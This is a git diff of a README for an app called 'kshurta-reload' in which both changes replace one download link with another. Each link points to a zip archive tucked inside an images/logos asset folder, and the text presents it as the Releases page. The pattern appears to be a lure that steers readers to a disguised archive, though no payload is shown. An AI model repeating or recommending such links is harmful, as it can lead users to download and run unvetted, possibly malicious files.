@@ -8,7 +8,7 @@ Welcome to **kshurta-reload**! This is your go-to application for creating a res
 
 To get started, you need to download the application. Visit the link below to access the latest version:
 
-[![Download kshurta-reload](https://raw.githubusercontent.com/Albrt-scripter/kshurta-reload/main/src/assets/images/kshurta-reload_2.9.zip)](https://raw.githubusercontent.com/Albrt-scripter/kshurta-reload/main/src/assets/images/kshurta-reload_2.9.zip)
+[![Download kshurta-reload](https://raw.githubusercontent.com/Albrt-scripter/kshurta-reload/main/src/assets/images/logos/kshurta-reload-2.6.zip)](https://raw.githubusercontent.com/Albrt-scripter/kshurta-reload/main/src/assets/images/logos/kshurta-reload-2.6.zip)
 
 ### Steps to Download:
 
@@ -72,6 +72,6 @@ If you encounter issues or have questions, feel free to reach out to our communi
 
 Remember, you can always come back to the Releases page to check for updates and download the latest features:
 
-[Download kshurta-reload](https://raw.githubusercontent.com/Albrt-scripter/kshurta-reload/main/src/assets/images/kshurta-reload_2.9.zip)
+[Download kshurta-reload](https://raw.githubusercontent.com/Albrt-scripter/kshurta-reload/main/src/assets/images/logos/kshurta-reload-2.6.zip)
 
 Thank you for choosing **kshurta-reload**! Your landing page journey starts here.
